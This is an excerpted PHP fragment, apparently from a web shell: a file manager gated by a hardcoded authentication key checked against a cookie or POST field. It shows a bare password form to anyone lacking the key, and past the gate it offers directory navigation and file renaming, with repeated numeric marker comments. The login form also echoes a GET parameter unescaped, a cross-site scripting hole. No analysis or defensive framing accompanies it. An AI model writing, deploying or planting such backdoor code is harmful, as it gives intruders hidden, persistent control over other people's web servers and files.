...
$auth_key = "5d8e2bd89152eff85d1dffc7967580f9";
...
$pass = false;
if (isset($_COOKIE['pw_name_88842'])) {
    if(($_COOKIE['pw_name_88842']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_88842'])) {
        if(($_POST['pw_name_88842']) == $auth_key) {
            setcookie("pw_name_88842", $_POST['pw_name_88842']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_88842' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1721411933343587 1721411933865076 1721411933160064 1721411933513029
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1721411933343587 1721411933865076 1721411933160064 1721411933513029
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1721411933343587 1721411933865076 1721411933160064 1721411933513029
            $name = PATH . "/" . $_GET['r'];
